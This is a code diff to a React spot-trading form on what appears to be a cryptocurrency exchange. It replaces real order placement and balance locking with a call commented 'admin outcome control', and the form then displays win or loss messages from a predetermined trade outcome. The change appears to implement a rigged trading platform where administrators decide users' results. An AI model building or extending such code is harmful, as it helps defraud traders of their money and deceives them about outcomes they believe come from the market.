@@ -3,7 +3,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { toast } from '@/components/ui/use-toast';
-import { tradingService } from '@/services/tradingService';
+import { tradingApiService } from '@/services/tradingApiService';
 import { walletService } from '@/services/wallet-service-new';
 import { useAuth } from '@/contexts/AuthContext';
 
@@ -76,40 +76,42 @@ export const SpotTradeForm: React.FC<SpotTradeFormProps> = ({
     
     setLoading(true);
     try {
-      // Lock balance first
-      await walletService.lockBalance({
-        userId: user.id,
-        asset: 'USDT',
-        amount: total,
-        reference: `spot-order-${Date.now()}`
-      });
-      
-      // Create the order
-      const order = await tradingService.createSpotOrder({
-        userId: user.id,
+      // Execute trade with admin outcome control
+      const response = await tradingApiService.executeSpotTrade({
         pair: symbol,
         side,
         type: orderType,
         amount: orderAmount,
         price: orderPrice,
-        total,
-        metadata: {
-          timestamp: Date.now(),
-          source: 'spot-trading-form'
+        total
+      });
+      
+      if (response.success) {
+        const { trade } = response;
+        
+        // Show appropriate message based on outcome
+        if (trade.outcome === 'win') {
+          toast({
+            title: "Winning Trade!",
+            description: `+$${trade.pnl.toFixed(2)} profit`,
+            variant: "default"
+          });
+        } else {
+          toast({
+            title: "Trade Lost",
+            description: `-$${Math.abs(trade.pnl).toFixed(2)}`,
+            variant: "destructive"
+          });
         }
-      });
+        
+        // Reset form
+        setAmount('');
+        setPercent(0);
+        setPrice('');
+        
+        onTradeComplete?.();
+      }
       
-      toast({
-        title: "Order Placed Successfully",
-        description: `Your ${side} order for ${orderAmount} ${symbol.replace('USDT', '')} has been placed.`
-      });
-      
-      // Reset form
-      setAmount('');
-      setPercent(0);
-      setPrice('');
-      
-      onTradeComplete?.();
     } catch (error: any) {
       console.error('Trade failed:', error);
       toast({
